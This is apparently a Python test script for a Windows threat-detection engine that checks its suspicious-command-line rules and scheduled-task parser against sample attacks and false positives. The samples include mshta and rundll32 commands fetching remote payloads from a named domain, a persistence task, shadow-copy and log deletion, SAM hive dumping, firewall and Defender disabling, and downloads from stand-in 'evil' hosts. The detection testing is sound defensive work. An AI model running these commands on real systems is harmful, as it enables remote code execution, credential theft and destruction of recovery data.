import sys
sys.path.insert(0, r"C:\Users\roeif\Desktop\Investigator\backend")
from app.detect.rules import SUSPICIOUS_CMDLINE_PATTERNS
from app.detect.engine import _parse_schtasks_create, _task_signals

S1 = r'''cmd.exe  /C rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WScript.Shell").run("mshta https://hotelesms.com/talsk.txt",0,true);'''
S2 = r'"C:\Windows\System32\mshta.exe" https://hotelesms.com/talsk.txt'
S3 = r'"C:\Windows\System32\schtasks.exe" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR "mshta.exe https://hotelesms.com/Injection.txt" /F'
FP1 = r'"C:\Program Files\Git\cmd\git.exe" fetch https://github.com/x'
FP2 = r'schtasks /query /tn foo'
FP3 = r'mshtaskhelper.exe https://ok'
# quoted variants of previously working patterns (sweep spot-checks)
Q = [
    r'"C:\Windows\System32\vssadmin.exe" delete shadows /all /quiet',
    r'"C:\Windows\System32\wevtutil.exe" cl Security',
    r'"C:\Windows\System32\reg.exe" save hklm\sam C:\out\sam',
    r'"C:\Windows\System32\wbadmin.exe" delete catalog -quiet',
    r'"C:\Windows\System32\bcdedit.exe" /set {default} recoveryenabled no',
    r'"C:\Windows\System32\net.exe" user hacker P@ss /add',
    r'"C:\Windows\System32\wmic.exe" process call create "cmd.exe"',
    r'"C:\Windows\System32\netsh.exe" advfirewall set allprofiles state off',
    r'"C:\Windows\System32\auditpol.exe" /clear /y',
    r'"C:\Windows\System32\fsutil.exe" usn deletejournal /d c:',
    r'"C:\Windows\System32\cipher.exe" /w:C',
    r'"C:\Windows\System32\bitsadmin.exe" /transfer job https://evil/x.exe c:\x.exe',
    r'"C:\Windows\System32\sc.exe" stop windefend',
    r'"C:\Windows\System32\reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v x /d c:\x.exe',
    r'"C:\tools\chisel.exe" client 1.2.3.4:8080 R:socks',
    r'"C:\tools\sdelete64.exe" -p 3 c:\secret.docx',
    r'regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll',
    r'powershell.exe -w hidden -c calc',
]

def hits(text):
    lower = text.lower()
    return [(d, sev) for rx, t, d, sev in SUSPICIOUS_CMDLINE_PATTERNS if rx.search(lower)]

for label, s in [("S1", S1), ("S2", S2), ("S3", S3), ("FP1", FP1), ("FP2", FP2), ("FP3", FP3)]:
    print(label, "->", hits(s))
print()
for s in Q:
    h = hits(s)
    print(("OK " if h else "MISS"), s[:60], "->", [d for d, _ in h])
print()
p = _parse_schtasks_create(S3)
print("parsed S3:", p)
if p:
    sig, strong = _task_signals(dict(p))
    print("signals:", sig, "strong:", strong)
print("parsed FP2:", _parse_schtasks_create(FP2))
